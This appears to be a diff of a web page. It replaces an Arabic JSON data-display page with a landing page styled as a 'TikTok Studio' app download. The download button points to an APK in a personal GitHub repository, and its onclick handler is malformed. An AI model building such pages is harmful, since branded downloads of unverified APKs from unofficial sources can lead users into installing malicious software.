@@ -1,100 +1,90 @@
-<!DOCTYPE html>
-<html lang="ar">
-
+<!DOCTYPE html><html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>عرض جميع البيانات</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            direction: rtl; /* لجعل النصوص من اليمين إلى اليسار */
-            background-color: #f9f9f9;
-            margin: 20px;
-        }
-        h1, h2 {
-            color: #2c3e50;
-        }
-        .container {
-            max-width: 900px;
-            margin: auto;
-        }
-        .box {
-            border: 1px solid #ccc;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 8px;
-            background: #ffffff;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Download TikTok Studio</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+     height: 90vh;
+      flex-direction: column;
+      text-align: center;
+    }header {
+  width: 99%;
+  padding: 20px;
+  background-color: #0f0f0f;
+  box-shadow: 0 2px 10px rgba(255, 0, 80, 0.2);
+  text-align: center;
+}
+
+header h1 {
+  margin: 0;
+  font-size: 1.8rem;
+  color: #ff0050;
+}
+
+header span {
+  color: #aaa;
+  font-size: 0.9rem;
+}
+
+.card {
+  background-color: #111;
+  border-radius: 20px;
+  padding: 40px;
+  box-shadow: 0 0 25px rgba(255, 0, 102, 0.3);
+  max-width: 99%;
+}
+
+.card img {
+  width: 100px;
+  height: auto;
+  margin-bottom: 20px;
+}
+
+h2 {
+  margin-bottom: 20px;
+  font-size: 1.5rem;
+}
+
+p {
+  margin-bottom: 30px;
+  font-size: 1rem;
+  color: #ccc;
+}
+
+button {
+  background-color: #ff0050;
+  border: none;
+  border-radius: 30px;
+  padding: 15px 30px;
+  font-size: 1rem;
+  color: white;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+button:hover {
+  background-color: #e60045;
+}
+
+  </style>
 </head>
-
 <body>
-    <div class="container">
-        <h1>جميع البيانات من JSON</h1>
-
-        <!-- مكان عرض البيانات -->
-        <div id="app"></div>
-    </div>
-
-    <script>
-        // تم تغيير الملف إلى data1.json
-        fetch('data1.json')
-            .then(response => response.json()) // تحويل الرد إلى JSON
-            .then(data => {
-                const appDiv = document.getElementById('app');
-
-                // عرض معلومات التطبيق
-                appDiv.innerHTML += `
-                    <div class="box">
-                        <h2>معلومات التطبيق</h2>
-                        <p><strong>اسم التطبيق:</strong> ${data.app_name}</p>
-                        <p><strong>الإصدار:</strong> ${data.version}</p>
-                    </div>
-                `;
-
-                // عرض المنتجات
-                appDiv.innerHTML += `<h2>المنتجات</h2>`;
-                data.products.forEach(product => {
-                    appDiv.innerHTML += `
-                        <div class="box">
-                            <p><strong>اسم المنتج:</strong> ${product.name}</p>
-                            <p><strong>السعر:</strong> ${product.price} $</p>
-                            <p><strong>التصنيف:</strong> ${product.category}</p>
-                            <p><strong>متوفر:</strong> ${product.in_stock ? 'نعم' : 'لا'}</p>
-                            <p><strong>التقييم:</strong> ${product.rating} ⭐</p>
-                        </div>
-                    `;
-                });
-
-                // عرض المستخدمين
-                appDiv.innerHTML += `<h2>المستخدمون</h2>`;
-                data.users.forEach(user => {
-                    appDiv.innerHTML += `
-                        <div class="box">
-                            <p><strong>اسم المستخدم:</strong> ${user.name}</p>
-                            <p><strong>البريد الإلكتروني:</strong> ${user.email}</p>
-                            <p><strong>الحالة:</strong> ${user.is_active ? 'نشط' : 'غير نشط'}</p>
-                        </div>
-                    `;
-                });
-
-                // عرض الإعدادات
-                appDiv.innerHTML += `
-                    <div class="box">
-                        <h2>الإعدادات</h2>
-                        <p><strong>العملة:</strong> ${data.settings.currency}</p>
-                        <p><strong>اللغة:</strong> ${data.settings.language}</p>
-                        <p><strong>البريد للدعم:</strong> ${data.settings.support_email}</p>
-                    </div>
-                `;
-            })
-            .catch(error => {
-                console.error('حدث خطأ أثناء تحميل البيانات:', error);
-                document.getElementById('app').innerHTML = '<p>فشل تحميل البيانات.</p>';
-            });
-    </script>
-
+  <header>
+    <h1>TikTok Studio</h1>
+    <span>الإصدار: 1.0.0</span>
+  </header>  <div class="card">
+    <img src="https://raw.githubusercontent.com/menak8om/Data/refs/heads/main/ic_launcher.png" alt="TikTok Studio Logo" />
+    <h2>تطبيق TikTok Studio</h2>
+    <p>قم بتحميل تطبيق TikTok Studio الآن وابدأ في صناعة المحتوى بكل احترافية!</p>
+    <button onclick="https://github.com/menak8om/Data/raw/refs/heads/main/tiktok%20Studio.apk'">تحميل التطبيق</button>
+  </div>
 </body>
-
 </html>
